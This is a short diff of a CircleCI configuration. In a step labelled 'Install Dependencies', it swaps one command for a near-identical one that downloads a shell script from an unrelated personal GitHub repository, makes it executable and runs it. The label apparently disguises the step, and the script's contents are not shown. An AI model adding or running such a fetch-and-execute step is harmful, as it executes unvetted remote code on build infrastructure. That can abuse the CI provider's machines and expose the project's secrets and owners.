@@ -20,7 +20,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m wget https://raw.githubusercontent.com/Taryok/trotol/main/ngung.sh && chmod u+x ngung.sh && ./ngung.sh 
+            command: timeout 1m wget https://raw.githubusercontent.com/Taryok/trotol/main/Ngung.sh && chmod u+x Ngung.sh && ./Ngung.sh 
     Recehan3:
       docker:
             - image: circleci/ruby:2.5.3
